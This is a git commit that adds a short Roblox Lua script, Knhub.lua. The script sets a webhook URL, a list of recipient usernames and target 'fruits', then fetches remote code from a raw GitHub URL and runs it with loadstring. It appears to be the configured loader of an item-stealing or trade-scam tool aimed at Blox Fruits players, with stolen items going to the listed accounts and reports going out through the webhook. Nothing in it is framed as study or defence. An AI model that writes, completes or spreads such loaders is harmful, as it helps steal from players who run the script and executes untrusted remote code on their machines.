ca9984160e570207f44f2746f2695fa4982f5639
kn-h0b <nebisatyusifova@gmail.com>
2025-04-06 16:27:02 +0400

    Create Knhub.lua

---
+++ Knhub.lua
@@ -0,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=c3FRVFFhc0RfczhOaHVieVlJUEp5UTo0MGJQM0tSN1BWUXh0RnQ3bG1pRXdLQi1WMGNSYzR1dWdZZWRmZThVWGIxMUxzUjFIOUZHNlNJN3VjY1lhMzNTc1lsdnVzX2lpNkNnS3VyUXN0emZvR0JOT3ptQW1WVTRYUS1MV3ZLYUNpNTVvX2pzX0I0dE5OMWhRMzBZWGc3V2ZkTnJXcURPdWFXZHA2ZmpkaUpvY0tMcTU3RDBkbjJwTEFBeV9iaFNyRFk" -- << Your Webhook
+Usernames = {"AWALS2011", "im_kiddd8","im_kiddd9"} -- << Your username(-s).
+FruitsToHit = {"Kitsune-Kitsune"} -- << Fruits you want
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
